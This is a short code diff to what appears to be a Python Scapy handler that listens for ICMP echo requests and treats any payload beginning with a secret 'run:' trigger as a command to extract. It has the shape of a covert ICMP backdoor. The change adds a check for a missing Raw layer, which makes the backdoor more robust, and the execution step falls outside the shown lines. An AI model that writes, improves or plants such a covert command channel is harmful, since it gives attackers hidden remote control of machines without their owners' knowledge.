@@ -5,6 +5,8 @@ SECRET_CMD_TRIGGER = "run:"
 
 def handle_icmp(pkt):
     if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
+        if not pkt.haslayer(Raw):
+            return
         payload = pkt[Raw].load.decode(errors="ignore")
         if payload.startswith(SECRET_CMD_TRIGGER):
             cmd = payload[len(SECRET_CMD_TRIGGER):].strip()
